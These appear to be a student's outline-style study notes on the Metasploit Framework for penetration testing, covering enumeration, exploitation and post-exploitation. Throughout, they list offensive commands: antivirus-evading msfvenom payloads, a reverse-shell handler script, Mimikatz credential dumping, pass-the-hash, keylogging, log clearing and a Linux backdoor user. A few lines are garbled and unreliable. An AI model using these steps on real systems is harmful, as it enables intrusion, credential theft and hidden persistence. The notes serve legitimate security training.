Metasploit Framework Overview

- Introduction to the Metasploit Framework
    - Open source, penetration testing and exploitation framework 
    - Provides infraestructure for automation
    - Terminology
        - Interface: methods of interacting with msf
        - Module: piece of code that performs a particular task
        - Exploit: piece of code or module used to take advantage of a vulnerability
        - Paylaod: piece of code delivered to the targer system by an exploit
        - Listener: utility that listens for an incoming connection from a target
    - Interfaces:
        - msfconsole
        - msfcli
        - Metasploit community edition
        - Armitage

- Metasploit Framework architecture
    - MSF modules:  
        - Exploit: a module that is used to take advantage of a vulnerability, typically paired with a payload
        - Payload: code that is delivered by MSF and remotely executed on the target
        - Encoder: used to avoid AV detection
        - NOPS: Used to ensure payload sizes are consistent
        - Auxiliary: module used yo perform additional functionality like port scanning and enumeration
    - MSF payload types:
        - Non staged payload: sent to the target as is 
        - Staged payload: sento to the target in two parts (stager + stage)
            - Stagers: used to establish a stable communication channel between attacker and target
            - Stage: payload components downloaded by the stager
        - Meterpreter payload: executed in memory, it communicates over a stager socket and provides an attacker with a command interpreter
        - MSF file system:
            - Modules: /usr/share/metasploit-framework/modules
            - User Modules: ~/.ms4/modules

- Penetration testing with the Metasploit Framework
    - PTES: Penetration Testing Execution Standard
        - Information gathering
        - Enumeration
        - Exploitation
        - Post-Exploitation
            - Privilege Escalation
            - Persistence 
            - Clearing tracks

Metasploit fundamentals

- Installing and configuring The Metasploit Framework
    - MSFDB: postgresql service is required

- MSFConsole fundamentals
    - MSF modules might require variables like the target IP and port to run successfully
    - show <exploits/modules/payloads...>
    - set payload windows/meterpreter/reverse_tcp
    - search

- Creating and managing workspaces
    - Workspaces allow to keep track of all the hosts, scans and activities 
    - workspace -a <name>
    - workspace <name>

- Port scanning with auxiliary modules (LAB)
    - part 1    
        - search portscan
        - use <name>
        - show options
        - set RHOSTS <ip>
        - run
        - search <web_app_name>
        - exploit
    - meterpreter
        - shell
        - /bin/bash -i
        - run autoroute -s <ip>
        - background
        - sessions   
    - setg <variable> to set global variable in metasploit 
    - loot
    - creds

- FTP enumeration
    - FTP: file transfer protocol
    - TCP port 21
    - Used frequently to transfer files between a directory to a web server
    - search type:auxiliary name:ftp 
    - ftp <ip> 
    - version, shares, users, anonymous login...

- SMB enumeration
    - Network sharing protocol over LAN networks
    - TCP port 445
    - SAMBA is the Linux implementation of SMB
    - search type:auxiliary name:smb 
    - smbclient -L \\\\<ip>\\ -U <user>
    - smbclient \\\\<ip>\\<share_name> -U <user> 
    - rpcclient -U "" -N <ip>
    - nmblookup -A demo.ine.local
    - version, shares, users, anonymous login...

- WEB server enumeration
    - Web servers use HTTP/S
    - TCP port 80,443
    - search type:auxiliary name:http
    - version, headers, robots.txt, directories, files, users

- MySQL enumeration
    - Open source relational database
    - TCP port 3306
    - search type:auxiliary name:mysql
    - version, credentials (brute force), accounts, mysql_sql, mysql_schema
    - SQLs
        - show databases;
        - use <database>;
        - show tables;
    - mysql -h <ip> -u <user> -p

- SSH enumeration
    - Remote administration protocol, typically used to access servers and systems
    - TCP port 22
    - search type:auxiliary name:ssh
    - version, credentials (brute force), users

- SMTP enumeration
    - Simple, mail transfer protocol
    - TCP port 25 or 465 or 587
    - search type:auxiliary name:stmp
    - version, users, 
    - nc <ip> <port>
        - VRFY <name>@<domain>

- Vulnerability scanning with metasploit
    - Process of scanning and detecting vulnerabilites and verifying wether they can be exploited
    - db_nmap -sS -sV -O <ip>
    - search type:exploit name:Microsoft IIS
    - set payload windows/meterpreter/reverse_tcp
    - searchsploit <service>
    - metasploit-autopwn
    - db_autopwn -p -t -PI <port>
    - analyze

- Vulnerability scanning with Nessus
    - Propietary vulnerability scanner
    - We can scan a target and then import the results to metasploit
    - Host discovery + port scanner + service and version scan + vulnerability scan
    - Nessus Essentials allows for 16 IPs to be scanned

- Web App Vulnerability scanning with WMAP
    - WMAP is available as an MSF plugin and can be loaded directly into mestasploit
    - When using metasploit:
        - load wmap 
        - wmap_*
        - wmap_sites -a <ip>
        - wmap_target -t http://<ip>/
        - wmap_run -t
        - wmap_run -e

Client-Side Attacks

- Generating Payloads with MSFVenom
    - Client-side attack: attack vector that involves coercing a client to execute a malicious payload
    - Typically uses social engineering
    - CS attacks take advantage of human vulnerabilites
    - MSFVenom is a command-line utility to generate and ecode payloads
    - msfvenom --list payloads
    - msfvenom --list formats
    - msfvenom -a <architecture> -p <payload> VAR=VAL -f <format>

- Encoding payloads with msfvenom
    - We need to be cognisant of anti-virus detection
    - Most AV use signature based detection
    - Encoding can help avoiding detection
    - Shellcode is code that provides an attacker with a remote shell (payload)
    - msfvenom -a <architecture> -p <payload> VAR=VAL -f <format> -i <iterations> -e <encoder>

- Injecting payloads into Windows portable executables
    - msfvenom -p <payload> VAR=VAL -f <format> -x <legitimate .exe file> -k
    - meterpreter:  
        - run post/windows/manage/migrate 

Automating

- Automating Metasploit with resource scripts
    - Resource script allow to automate repetitive tasks and commands
    - They operate similar to batch scripts in Windows
    - Setup handler.rc
        use multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 1.1.1.1
        set LPORT 1234
        run
    - msfconsole -r resource_script.rc
    - In msfconsole
        - resource resource_script.rc
        - makerc new_script.rc

Windows Exploitation

- Exploiting a vulnerable HTTP File Server
    - HFS is a web server that is designed for file and document sharing
    - Typically run on TCP port 80
    
- Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)
    - Takes advantage of a vulnerability that allows to send specially crafted packets
    - Targets SMB version 1
    - It affects multiple windows versions
    - MSF has a module to check if a system is vulnerable
    - nmap -sV -p 445 --script=smb-vuln-ms17-010 <ip>
    - Manual exploitation with AutoBlue-MS17-010
    - Automatic exploitation with msfconsole
        - search eternalblue
        - exploit

- Exploiting WinRM
    - Windows remote management that can be used to remote access to systems over HTTPS
    - Tipically uses TCP port 5985 and 5986
    - crackmapexec (brute-force)
        - crackmapexec winrm <IP> -u administrator -p <password_wordlist>
        - crackmapexec winrm <IP> -u administrator -p <password> -x "<command>"
    - evil-winrm (ruby script to get a session)
        - evil-winrm.rb -u administrator -p <password> -i <IP> 

- Exploiting a vulenrable Apache Tomcat web server
    - Apache Tomcat is used to host dynamic websites or web apps developed in Java
    - HTTP Server TCP port 8080
    - search specific windows file dir C:\Windows\System32\*.txt /s /b

Linux Exploitation

- Exploiting a Vulnerable FTP Server
    - FTP is file transfer protocol TCP port 21
    - Used to transfer website files to and from a server

- Exploiting Samba
    - TCP port 445
    - SAMBA is the Linux implementation of SMB

- Exploiting a Vulnerable SSH Server
    - Secure shell TCP port 22

- Exploiting a Vulnerable SMTP Server
    - Sunoke Nauk Transfer Protocol
    - TCP port 25, 465 and 587
    - Haraka is a high performance SMTP server developed in node.js 

- RSYNC
    - rsync rsync://target1.ine.local
    - rsync -av rsync://target1.ine.local/backupwscohen/ .

Post Exploitation Fundamentals

- Meterpreter Fundamentals
    - Advanced multi-functional payload that operates via DLL injection, executed in memory
    - Meterpreter allows us to load custom script and plugins dynamically
    - Meterpreter:
        - sysinfo
        - getuid
        - help
        - sessions
        - ls 
        - pwd
        - cd ..
        - cat file 
        - download file 
        - checksum md5 file
        - getenv VAR 
        - search -d /usr/bin -f *backdoor*
        - search -f *.jpg
        - shell 
        - ps 
        - migrate PID 
        - execute -f command

- Upgrading command shells to meterpreter shells
    - shell_to_meterpreter module
    - sessions -u SESSION

Windows Post Exploitation

- Windows Post Exploitation Modules
    - Meterpreter:
        - getsystem
        - hashdump
        - show_mount
        - migrate explorer.exe
    - module enum_logged_on_users
    - module enum_applications
    - loot to see all saved files 
    - module enum_av_excluded
    - module enum_computer
    - module enum_patches
        - syteminfo
    - module enum_shares
    - module enable_rdp

- Windows Privilege Escalation: Bypassing UAC
    - UAC (User account control)
    - Windows security feature used to prevent unauthorized changes from being made to the operating system
    - A non-privileged user will be prompted with the UAC credential prompt
    - A privileged user will be prompeted with the consent prompt
    - To bypass UAC access to a user account what is a part of the local administrators group is needed
    - UAC has different integrity levels from low to high. If set below high, programs can be executed with elevated privileges without prompting the user
    - Module "Windows Escalate UAC Protection Bypass (In Memmory Injection)" to bypass UAC
        - Need x64

- Windows Privilege Escalation: Token Impersonation with Incognito
    - Windows access tokens are a core element of the authetication process in Windows systems
    - A token is used so users do not have to provide credentials every time a process is started or a resource is accessed
    - Access tokens are generated by winlogon.exe process. The token is attached to the userinit.exe process. All child processes inherit a copy
    - Access tokens are asigned on security level:
        - Impersonate-level: created as a result of non-interactive login
        - Delegate-level: interactive login such as RDP
    - Impersonate-level tokens can be used to impersonate a token on the local system ONLY
    - Delegate-level tokens can be used to impersonate a token on any system that utilizes the token
    - Privileges that are required for a successful attack:
        - SeAssignPrimaryToken: allows impersonate tokens
        - SeCreateToken: allows create an arbitrary token with administrative privileges 
        - SeImpersonatePrvilege: allows create a process under the security context of another user 
    - Incognito:
        - load Incognito
        - list_tokens
        - list_tokens -u
        - impersonate_token "<user>"

- Dumping hashes with Mimikatz
    - Mimikatz is a post-exploitation tool for the extraction of clear-text passwords, hashes and Kerberos tickets
    - Mimikatz can be used to extract hashes from the lsass.exe process
    - Meterpreter has an inbuilt extension called Kiwi
    - It needs elevated privileges
    - MSF   
        - load kiwi 
        - creds_all
        - lsa_dump_sam
        - lsa_dump_secrets
        - upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
    - mimikatz.exe
        - privilege::debug
        - lsadump::sam
        - lsadump::secrets
        - sekurlsa::logonpasswords

- Pass-The-Hash with psexec
    - Technique that involves capturing NTLM or clear-text passwords and using them to authenticate with the target
    - Psexec, crackmapexec are tools that can facilitate pass-the-hash
        - SMBPass can be the LM:NTLM hash
    - crackmapexec smb <ip> -u Administrator -H "<NTLM>" -x "<command>"
    - Involves capturing NTLM hashes or clear-text passwords and use them to authenticate with the target
    - Pass-The-Hash is used to authenticate legitmately (persistance)
    - Get hashes:
        - psgrep lsass
        - migrate x
        - load kiwi
        - lsa_dump_sam
        - hashdump
    - psexec
        - remeber to set target and set user and password/hash
        - needs LM and NTLM hashes
    - crackmapexec smb <ip> -u <user> -H "<NTLM hash>" -x "<command>"

- Establishing persistance on Windows
    - Persistance consists of techniques that attackers use to keep acces to systems across restarts, changed credentials, etc
    - We can establish persistance with a service
    - search platform:windows persistence 
        - windows/local/persistence_service
        - use multi/handler

- Enabling RDP
    - RDP uses TCP port 3389
    - It is used to remotely connect and interact with a Windows System (GUI)
    - module enable_rdp
    - xfreerdp /u:administrator /p:hacker_123321 /v:10.2.19.85

- Windows Keylogging
    - Keylogging is the process of recording or capuring the keystrokes entered on a target system
    - keyscan_start
    - keyscan_end
    - keyscan_dump

- Clearing Windows Event logs 
    - Windows stores and catalogues all actions/event performed on the system
    - Application Logs: Stores application/program events like startup, crashes, etc
    - System logs: stores system events like reboots, etc
    - Security logs: stores security events like password changes, auth failures, etc
    - Can be accessed via the Event Viewer
    - clearev
    - remove files used for priv esc/foothold

- Pivoting
    - After gaining access to a host, we can use it to access other hosts that were not available from outside the network 
    - Meterpreter provides us with the ability to automatically do this
    - run autoroute -s 10.2.18.0/20
    - Port forwarding in meterpreter
        - portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE IP>

Linux Post Exploitation

- Linux Post Exploitation Modules
    - Enumerate system configuration, env variables, network configuration, VM, user history
    - Modules:
        - post/linux/gather/enum_configs
        - post/multi/gather/env
        - post/linux/gather/enum_network
        - post/linux/gather/enum_protections
        - post/linux/gather/enum_system
        - post/linux/gather/checkcontainer
        - post/linux/gather/checkvm
        - post/linux/gather/enum_users_history
        - post/multi/manage/system_session
        - post/linux/manage/download_exec
    - Linux commands:
        - whoami
        - groups root
        - cat /etc/passwd
        - cat /etc/*issue
        - uname -a 
        - ip a s
        - netstat -antp
        - ps aux
        - env
        - history

- Linux Privilege Escalation: Exploiting a vulnerable program
    - The privilege escalation techniques we can utilize will depend on the version of the linux kernel as well as the distribuiton release
    - chrootkit privilege escalation

- Dumping hashes with hashdump
    - Linux password hashes are stored in /etc/shadow file and can be only accessed by the root user
    - Hashed passwords can be cracked using John or other tools
    - hashdump

- Establishing persistance on Linux
    - Persistance consists of techniques that attackers use to keep acces to systems across restarts, changed credentials, etc
    - The persistance techiniques will depend on the target configuration
    - Backdoor user
        - useradd -m ftp -s /bin/bash
        - passwd ftp password123
        - usermod -aG root ftp
        - usermod -u 15 ftp
    - Cronjob
    - SSH key 
    - Service
    - search platform:linux persistence

Metasploit GUIs

- Port Scanning and Enumeration with Armitage
    - Armitage is a free java-based frontend for metasploit
    - Visualizes Targets
    - Automate port scanning 
    - Automate exploitation
    - Automate post exploitation

- Exploitation and Post Exploitation with armitage
    - Exploitation and post-exploitation modules 